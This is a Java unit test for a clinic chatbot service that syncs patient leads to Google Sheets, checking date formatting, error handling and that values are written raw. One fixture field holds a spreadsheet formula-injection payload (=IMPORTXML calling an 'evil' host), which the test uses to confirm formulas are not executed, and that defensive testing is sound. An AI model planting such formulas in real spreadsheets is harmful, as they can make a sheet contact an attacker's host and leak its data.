package com.nhcdc.chatbot.service.sheet;

import com.google.api.services.sheets.v4.Sheets;
import com.google.api.services.sheets.v4.model.ValueRange;
import com.nhcdc.chatbot.config.GoogleSheetsProperties;
import com.nhcdc.chatbot.entity.Centre;
import com.nhcdc.chatbot.entity.Lead;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;

import java.io.IOException;
import java.time.Instant;
import java.time.LocalDate;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

class GoogleSheetsLeadSyncServiceTest {

    private Sheets.Spreadsheets.Values values;
    private Sheets.Spreadsheets.Values.Append append;
    private GoogleSheetsLeadSyncService service;

    @BeforeEach
    void setUp() throws IOException {
        Sheets sheets = mock(Sheets.class);
        Sheets.Spreadsheets spreadsheets = mock(Sheets.Spreadsheets.class);
        values = mock(Sheets.Spreadsheets.Values.class);
        append = mock(Sheets.Spreadsheets.Values.Append.class);
        when(sheets.spreadsheets()).thenReturn(spreadsheets);
        when(spreadsheets.values()).thenReturn(values);
        when(values.append(anyString(), anyString(), any(ValueRange.class))).thenReturn(append);
        when(append.setValueInputOption(anyString())).thenReturn(append);

        GoogleSheetsProperties properties = new GoogleSheetsProperties();
        properties.setSpreadsheetId("sheet-id");
        properties.setSheetName("Leads");
        service = new GoogleSheetsLeadSyncService(sheets, properties);
    }

    private Lead lead() {
        return Lead.builder()
                .leadCode("NHCDC-00012")
                // 08:17 UTC is 01:47 PM in India
                .createdAt(Instant.parse("2026-10-02T08:17:00Z"))
                .whatsappNumber("919876543210")
                .patientName("Aarav Sharma")
                .patientNumber("9876543210")
                .dateOfBirth(LocalDate.of(2021, 3, 14))
                .concern("=IMPORTXML(\"http://evil\")")
                .centre(Centre.builder().name("Mahim").address("a").build())
                .referralDoctor("None")
                .consentGiven(true)
                .build();
    }

    @Test
    void createdIsWrittenAsReadableIndiaTimeWithAmPm() throws IOException {
        service.syncLead(lead());

        ArgumentCaptor<ValueRange> body = ArgumentCaptor.forClass(ValueRange.class);
        verify(values).append(eq("sheet-id"), eq("Leads!A1"), body.capture());
        List<Object> row = body.getValue().getValues().get(0);
        assertEquals("NHCDC-00012", row.get(0));
        assertEquals("02-10-2026 01:47 PM", row.get(1));
        assertEquals("14-03-2021", row.get(5));
        assertEquals("Mahim", row.get(7));
        assertEquals("Yes", row.get(10));
    }

    @Test
    void valuesAreSentRawSoGoogleDoesNotReformatDatesOrRunFormulas() throws IOException {
        service.syncLead(lead());

        verify(append).setValueInputOption("RAW");
    }

    @Test
    void googleFailureIsReportedAsSheetSyncException() throws IOException {
        when(append.execute()).thenThrow(new IOException("403 forbidden"));

        SheetSyncException ex = assertThrows(SheetSyncException.class, () -> service.syncLead(lead()));

        assertEquals(true, ex.getMessage().contains("NHCDC-00012"));
    }
}
